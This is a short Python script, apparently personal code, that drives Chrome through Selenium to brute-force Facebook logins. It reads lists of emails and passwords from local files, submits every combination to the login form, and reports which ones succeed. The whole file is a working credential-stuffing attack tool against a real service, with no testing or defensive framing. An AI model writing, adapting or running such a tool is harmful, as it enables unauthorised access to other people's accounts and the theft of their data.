from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time


path = '/Users/ayoub/Downloads/chromedriver'
driver = webdriver.Chrome(path)
driver.get("https://facebook.com")
user_list = open('email.txt' , 'r')
pass_list = open('pass.txt' , 'r')
email = []
Word = []



for Email in user_list:
    email.append(Email)

for word in pass_list:
    Word.append(word)

try:
    for User in email:
        for Pass in Word:
            user = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'email')))
            user.clear()
            user.send_keys(User.strip())
            password = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'pass')))
            password.clear()
            password.send_keys(Pass.strip())
            submit = driver.find_element_by_name('login')
            submit.click()
            time.sleep(1)
            login_fall = driver.current_url
            if "login" in login_fall:
                print("User: " + User + " and " + Pass + " combo FAILED")
            elif login_fall == "https://www.facebook.com/":
                print("User: " + User + " and " + Pass + " combo SUCCES")

            
        
except:
    driver.quit()
